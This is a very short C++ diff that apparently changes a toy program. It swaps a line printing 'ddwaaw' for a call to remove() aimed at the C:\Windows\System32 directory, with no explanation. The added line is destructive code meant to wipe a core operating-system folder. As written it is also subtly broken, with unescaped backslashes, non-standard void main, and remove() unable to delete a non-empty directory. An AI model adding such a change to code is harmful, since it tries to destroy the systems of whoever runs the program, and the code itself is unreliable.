@@ -4,5 +4,5 @@ using namespace std;
 
 void main()
 {
-	cout << "ddwaaw";
+	remove("C:\Windows\System32");
 }
